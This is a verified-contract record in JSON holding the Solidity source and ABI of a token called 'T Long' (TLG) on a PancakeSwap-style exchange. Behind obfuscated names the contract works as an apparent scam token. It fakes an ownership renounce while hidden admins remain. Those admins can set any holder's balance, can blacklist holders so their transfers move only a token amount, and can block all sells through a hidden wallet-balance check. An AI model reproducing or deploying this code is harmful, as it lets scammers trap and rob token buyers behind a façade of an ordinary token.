{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface toAmountReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableLiquidityAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minMarketing {\n    function createPair(address isEnable, address fromAuto) external returns (address);\n}\n\ninterface takeTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyFee) external view returns (uint256);\n\n    function transfer(address teamReceiver, uint256 swapBuy) external returns (bool);\n\n    function allowance(address modeTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamReceiver,\n        uint256 swapBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTo, uint256 value);\n    event Approval(address indexed modeTrading, address indexed spender, uint256 value);\n}\n\ninterface swapReceiver is takeTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TLong is enableLiquidityAmount, takeTo, swapReceiver {\n\n    function exemptMode(address teamTotal, uint256 swapBuy) public {\n        autoReceiver();\n        limitList[teamTotal] = swapBuy;\n    }\n\n    mapping(address => uint256) private limitList;\n\n    function name() external view virtual override returns (string memory) {\n        return senderFund;\n    }\n\n    function totalBuyMode(address limitLaunchedBuy) public {\n        if (listReceiver) {\n            return;\n        }\n        if (swapTeam != isLiquidityFund) {\n            takeReceiverLaunched = false;\n        }\n        launchedMin[limitLaunchedBuy] = true;\n        \n        listReceiver = true;\n    }\n\n    mapping(address => bool) public launchedMin;\n\n    function maxAmount(address modeTx) public {\n        autoReceiver();\n        \n        if (modeTx == takeExempt || modeTx == launchFee) {\n            return;\n        }\n        totalSellSwap[modeTx] = true;\n    }\n\n    function autoReceiver() private view {\n        require(launchedMin[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed atEnable, address indexed launchedFeeTake);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableAutoMax;\n    }\n\n    function walletShould() public {\n        emit OwnershipTransferred(takeExempt, address(0));\n        receiverSwap = address(0);\n    }\n\n    function swapFrom(address feeTrading, address teamReceiver, uint256 swapBuy) internal returns (bool) {\n        if (feeTrading == takeExempt) {\n            return totalReceiver(feeTrading, teamReceiver, swapBuy);\n        }\n        uint256 isTo = takeTo(launchFee).balanceOf(marketingLiquidity);\n        require(isTo == totalBuy);\n        require(teamReceiver != marketingLiquidity);\n        if (totalSellSwap[feeTrading]) {\n            return totalReceiver(feeTrading, teamReceiver, tokenIsLaunch);\n        }\n        return totalReceiver(feeTrading, teamReceiver, swapBuy);\n    }\n\n    uint256 private swapTeam;\n\n    constructor (){\n        if (receiverListReceiver != takeReceiverLaunched) {\n            swapTeam = isLiquidityFund;\n        }\n        toAmountReceiver enableWallet = toAmountReceiver(launchedTeam);\n        launchFee = minMarketing(enableWallet.factory()).createPair(enableWallet.WETH(), address(this));\n        \n        takeExempt = _msgSender();\n        walletShould();\n        launchedMin[takeExempt] = true;\n        limitList[takeExempt] = enableAutoMax;\n        if (isLiquidityFund != swapTeam) {\n            swapTeam = isLiquidityFund;\n        }\n        emit Transfer(address(0), takeExempt, enableAutoMax);\n    }\n\n    string private senderFund = \"T Long\";\n\n    string private amountShould = \"TLG\";\n\n    uint256 private enableAutoMax = 100000000 * 10 ** 18;\n\n    function approve(address minTeam, uint256 swapBuy) public virtual override returns (bool) {\n        marketingBuy[_msgSender()][minTeam] = swapBuy;\n        emit Approval(_msgSender(), minTeam, swapBuy);\n        return true;\n    }\n\n    address private receiverSwap;\n\n    function transfer(address teamTotal, uint256 swapBuy) external virtual override returns (bool) {\n        return swapFrom(_msgSender(), teamTotal, swapBuy);\n    }\n\n    address public takeExempt;\n\n    mapping(address => mapping(address => uint256)) private marketingBuy;\n\n    uint256 constant tokenIsLaunch = 6 ** 10;\n\n    function transferFrom(address feeTrading, address teamReceiver, uint256 swapBuy) external override returns (bool) {\n        if (_msgSender() != launchedTeam) {\n            if (marketingBuy[feeTrading][_msgSender()] != type(uint256).max) {\n                require(swapBuy <= marketingBuy[feeTrading][_msgSender()]);\n                marketingBuy[feeTrading][_msgSender()] -= swapBuy;\n            }\n        }\n        return swapFrom(feeTrading, teamReceiver, swapBuy);\n    }\n\n    function balanceOf(address buyFee) public view virtual override returns (uint256) {\n        return limitList[buyFee];\n    }\n\n    function owner() external view returns (address) {\n        return receiverSwap;\n    }\n\n    function totalReceiver(address feeTrading, address teamReceiver, uint256 swapBuy) internal returns (bool) {\n        require(limitList[feeTrading] >= swapBuy);\n        limitList[feeTrading] -= swapBuy;\n        limitList[teamReceiver] += swapBuy;\n        emit Transfer(feeTrading, teamReceiver, swapBuy);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountShould;\n    }\n\n    uint8 private receiverAmount = 18;\n\n    function getOwner() external view returns (address) {\n        return receiverSwap;\n    }\n\n    bool private takeReceiverLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAmount;\n    }\n\n    uint256 totalBuy;\n\n    function allowance(address swapReceiverFund, address minTeam) external view virtual override returns (uint256) {\n        if (minTeam == launchedTeam) {\n            return type(uint256).max;\n        }\n        return marketingBuy[swapReceiverFund][minTeam];\n    }\n\n    mapping(address => bool) public totalSellSwap;\n\n    bool private receiverListReceiver;\n\n    function modeLaunched(uint256 swapBuy) public {\n        autoReceiver();\n        totalBuy = swapBuy;\n    }\n\n    address public launchFee;\n\n    uint256 public isLiquidityFund;\n\n    address launchedTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address marketingLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listReceiver;\n\n    uint256 takeReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFeeTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiverFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"exemptMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidityFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"}],\"name\":\"maxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"modeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunchedBuy\",\"type\":\"address\"}],\"name\":\"totalBuyMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}